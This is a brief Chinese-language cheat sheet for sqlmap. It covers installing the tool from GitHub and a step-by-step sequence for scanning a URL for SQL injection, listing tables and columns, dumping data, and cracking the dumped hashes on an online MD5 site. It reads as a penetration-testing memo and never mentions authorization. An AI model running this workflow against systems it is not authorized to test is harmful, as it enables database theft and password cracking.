SQLMAP
=============================


介绍
~~~~~~~~~~~~~~~~~~~~~~
sql漏洞检测和注入工具

安装
~~~~~~~~~~~~~~~~~~~~
目前工具开源，可以从github上获取
需要注意sqlmap必须要求python版本低于3.3

::

  git clone https://github.com/sqlmapproject/sqlmap.git
  alias sqlmap='python /Users/wangjianfeng/Code/github/sqlmap/sqlmap.py'



扫描
~~~~~~~~~~~~~~~~~~~~~~~

::

  sqlmap -u "url"
  扫描到后则检查表名
  sqlmap -u "url" --tables
  扫描到部分表名后破解列名
  sqlmap -u "url" --columns -T "tablename"
  扫描到列名后则导出数据
  sqlmap -u "url" --dump -C "列名" -T "tablename"
  之后将内容进行解密
  http://www.cmd5.com/
